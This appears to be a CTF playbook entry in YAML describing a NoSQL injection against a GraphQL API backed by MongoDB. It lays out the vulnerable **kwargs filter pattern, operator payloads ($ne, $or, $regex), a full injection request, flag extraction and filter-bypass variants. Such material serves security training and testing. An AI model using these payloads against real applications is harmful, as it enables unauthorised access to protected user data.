name: nosql_injection_graphql_mongodb
category: web
tags: [nosql, nosqli, graphql, mongodb, injection, mongoengine]
indicators:
  - "GraphQL API with search parameter"
  - "json.loads() on user input"
  - "MongoDB query with **kwargs unpacking"
  - "query.filter(**search_criteria)"
  - "Admin users filtered from default view"
  - "Flag in admin user's profile"

tricks:
  - name: "Step 1: Identify NoSQL injection vulnerability"
    when: "Found GraphQL API with search parameter"
    how: "Check if search parameter is JSON parsed and used in MongoDB query"
    payload: |
      # schema.py line 11-16:
      # if search:
      #     try:
      #         search_criteria = json.loads(search)
      #         query = query.filter(**search_criteria)
      #     except json.JSONDecodeError:
      #         pass
      #
      # Vulnerability:
      # - search parameter is JSON parsed without validation
      # - Result is unpacked with **search_criteria into filter()
      # - Allows MongoDB query operators to be injected
      # - No whitelist or sanitization

  - name: "Step 2: Understand default filtering"
    when: "Analyze application behavior"
    how: "Check what users are shown by default"
    payload: |
      # scripts.js line 43:
      # Default query filters: {"email": {"$regex": ".*@heytheregotrythis.com"}, "is_admin": false}
      #
      # This excludes admin users from the default view
      # Admin users exist:
      # - admin@heytheregotrythis.com (is_admin=True, no flag)
      # - admin2@goodyoutriedsomethingelse.com (is_admin=True, flag=FLAG{...})

  - name: "Step 3: Craft NoSQL injection payload"
    when: "Ready to exploit"
    how: "Inject MongoDB query operators to get admin users"
    payload: |
      # Basic payload to get all admin users:
      {"is_admin": true}
      #
      # This bypasses the default filter and returns admin users
      #
      # Alternative payloads:
      {"is_admin": {"$ne": false}}  # Not equal to false
      {"$or": [{"is_admin": true}]}  # OR condition
      {"email": {"$regex": ".*@goodyoutriedsomethingelse.com"}}  # Specific domain

  - name: "Step 4: Send GraphQL query with NoSQL injection"
    when: "Payload ready"
    how: "POST to /api/users with GraphQL query containing injected search"
    payload: |
      POST /api/users
      Content-Type: application/json
      {
        "query": "query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email flag } }"
      }
      #
      # The application:
      # 1. Receives GraphQL query
      # 2. Extracts search parameter: "{\"is_admin\": true}"
      # 3. JSON parses it: {"is_admin": true}
      # 4. Unpacks into filter(): query.filter(is_admin=True)
      # 5. Returns admin users with flag field

  - name: "Step 5: Extract flag from response"
    when: "Query executed successfully"
    how: "Extract flag from admin user's data"
    payload: |
      # Response structure:
      # {
      #   "users": [
      #     {
      #       "username": "admin",
      #       "email": "admin@heytheregotrythis.com",
      #       "flag": null
      #     },
      #     {
      #       "username": "admin2",
      #       "email": "admin2@goodyoutriedsomethingelse.com",
      #       "flag": "FLAG{...}"
      #     }
      #   ]
      # }
      #
      # Flag extraction:
      # for user in response["users"]:
      #     if user.get("flag"):
      #         flag = user["flag"]
      #
      # Note: admin2 user has the flag

  - name: "Alternative: Query by domain"
    when: "Need to target specific admin"
    how: "Use email regex to find admin2"
    payload: |
      # Query admin2 specifically:
      {"email": {"$regex": ".*@goodyoutriedsomethingelse.com"}}
      #
      # Or combine conditions:
      {"$and": [{"is_admin": true}, {"email": {"$regex": ".*goodyoutriedsomethingelse.*"}}]}

  - name: "Bypass techniques"
    when: "Basic injection blocked or filtered"
    how: "Use alternative MongoDB operators"
    payload: |
      # Use $ne (not equal):
      {"is_admin": {"$ne": false}}
      #
      # Use $or:
      {"$or": [{"is_admin": true}]}
      #
      # Use $and:
      {"$and": [{"is_admin": true}]}
      #
      # Use regex on email:
      {"email": {"$regex": ".*admin.*"}}
      #
      # Note: **kwargs unpacking allows any MongoDB operator
